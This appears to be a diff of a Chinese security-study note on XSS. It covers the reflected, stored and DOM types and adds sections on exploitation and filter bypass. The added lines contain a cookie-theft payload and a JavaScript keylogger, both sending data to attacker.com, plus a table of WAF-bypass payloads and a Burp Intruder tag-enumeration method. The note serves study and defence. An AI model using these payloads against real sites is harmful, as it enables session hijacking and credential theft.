@@ -14,11 +14,11 @@ XSS 是 CVE 数据库中报告最频繁的 Web 漏洞之一，长期位于 OWASP
 
 ---
 
-## 二、攻击方式
+# 二、攻击方式
 
 XSS 攻击主要分为三类：**反射型**、**存储型**、**DOM 型**[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。前两种需要经过服务器，最后一种仅涉及客户端，由前端 JS 逻辑缺陷导致-。
 
-### 2.1 反射型 XSS（Reflected XSS）
+## 2.1 反射型 XSS（Reflected XSS）
 
 **攻击流程**：攻击者将恶意脚本附加到 URL 参数中，通过钓鱼等方式诱骗用户点击链接，服务器将参数“反射”回页面，浏览器执行恶意脚本[-3](https://cloud.baidu.com/article/3361360)[-11](https://developer.baidu.com/article/detail.html?id=3361362)。
 
@@ -30,7 +30,7 @@ XSS 攻击主要分为三类：**反射型**、**存储型**、**DOM 型**[-5](h
 
 **实战案例**：NASA 某子域名曾因 User-Agent 输入未过滤导致反射型 XSS，攻击者可利用该漏洞窃取会话 Cookie[-24](https://bugcrowd.com/disclosures/da0e3345-4a66-428f-a4d4-55f8dbf9c589/reflected-xss-exploit-chain-with-session-cookie-theft-on-nasa-subdomain)。
 
-### 2.2 存储型 XSS（Stored XSS）
+## 2.2 存储型 XSS（Stored XSS）
 
 **攻击流程**：恶意脚本被永久存储在服务器（数据库或文件系统），当任何用户访问受影响页面时，脚本自动从服务器加载并执行[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)[-3](https://cloud.baidu.com/article/3361360)。
 
@@ -42,7 +42,7 @@ XSS 攻击主要分为三类：**反射型**、**存储型**、**DOM 型**[-5](h
 
 **实战案例**：富士通披露的 CVE-2024-42834 漏洞中，攻击者通过 API 在用户姓氏字段注入恶意脚本，管理员查看客户记录时脚本自动执行，可窃取会话令牌、冒充用户[-25](https://corporate-blog.global.fujitsu.com/apac/2025-08-26/01/)。
 
-### 2.3 DOM 型 XSS（DOM-based XSS）
+## 2.3 DOM 型 XSS（DOM-based XSS）
 
 **攻击流程**：不依赖服务器，通过修改客户端 DOM 环境执行恶意代码，页面本身无变化，但 DOM 被恶意修改导致代码执行[-1](https://cloud.tencent.cn/developer/article/2437214?from=15425)。
 
@@ -50,7 +50,7 @@ XSS 攻击主要分为三类：**反射型**、**存储型**、**DOM 型**[-5](h
 
 **示例**：页面 JS 执行 `document.body.innerHTML = location.hash`，攻击者构造 URL `https://example.com/#<img src=x onerror=alert(1)>`，恶意代码被执行[-5](https://semgrep.dev/docs/learn/vulnerabilities/cross-site-scripting)。
 
-### 2.4 三种类型对比
+## 2.4 三种类型对比
 
 |类型|存储位置|是否需要服务器|持久性|危害范围|
 |---|---|---|---|---|
@@ -59,3 +59,75 @@ XSS 攻击主要分为三类：**反射型**、**存储型**、**DOM 型**[-5](h
 |DOM 型|浏览器 DOM|否|视具体场景|取决于漏洞位置|
 
 ---
+
+# 三、攻击利用方式
+
+XSS 攻击者可利用 JavaScript 在浏览器中执行以下操作[-1](https://cloud.tencent.cn/developer/article/2437214?from=15425)：
+
+## 3.1 窃取 Cookie 与会话劫持
+```javascript
+// 将 Cookie 发送到攻击者服务器
+<script>window.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
+```
+获得 Cookie 后，攻击者可冒充用户身份登录。
+
+## 3.2 键盘记录
+```javascript
+// 监听并发送键盘输入
+<script>
+document.onkeypress = function(e) {
+    fetch('http://attacker.com/log', {method:'POST', body:e.key});
+}
+</script>
+```
+## 3.3 钓鱼攻击
+
+通过修改页面 DOM 伪造登录框，窃取用户密码。常见于存储型 XSS。
+
+### 3.4 内网探测
+
+利用 JavaScript 发起内网请求，探测内网资产，常用于跳板攻击。
+
+### 3.5 挂马与蠕虫传播
+
+利用 XSS 漏洞传播恶意软件或跨站脚本蠕虫[-11](https://developer.baidu.com/article/detail.html?id=3361362)。
+
+---
+
+## 四、绕过技巧与 WAF 对抗
+
+### 4.1 标签与属性枚举
+
+应用程序通常会过滤某些标签或属性，但往往不会过滤全部。可使用 [[Burp Suite]] 的 **Intruder** 模块枚举允许的标签和属性，从而构造有效的 payload[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)。
+
+**流程**：
+
+1. 将请求发送到 Intruder
+    
+2. 用 `<§§>` 测试标签，用 `<tag §§="test">` 测试属性
+    
+3. 观察哪些标签/属性返回 200 状态码
+    
+4. 利用允许的标签和属性构造 payload[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)
+    
+
+PortSwigger 提供 XSS Cheat Sheet 可直接使用[-21](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/xss/bypassing-filters)。
+
+### 4.2 常见过滤绕过方法
+
+|过滤方式|绕过技巧|示例|
+|---|---|---|
+|`<script>` 过滤|使用其他标签 + 事件|`<img src=x onerror=alert(1)>`|
+|关键字过滤（`alert`）|使用编码或 `eval`|`alert` → `\u0061lert`|
+|引号过滤|闭合引号|`"> <img src=x onerror=alert(1)>`|
+|大小写检测|大小写混合|`<ScRiPt>alert(1)</sCrIpT>`|
+|双写绕过|双写关键字|`<scrscriptipt>alert(1)</scrscriptipt>`|
+|Unicode 编码|编码 payload|`javascript:alert(1)` 编码|
+
+**详细绕过方法参考**：[-39](https://www.cnblogs.com/TNpiper/p/18568929)
+
+### 4.3 利用 XSS 工具
+
+- **XSStrike**：高级 XSS 检测与绕过框架[-39](https://www.cnblogs.com/TNpiper/p/18568929)
+    
+- **XSS-Labs**：XSS 通关靶场[-39](https://www.cnblogs.com/TNpiper/p/18568929)
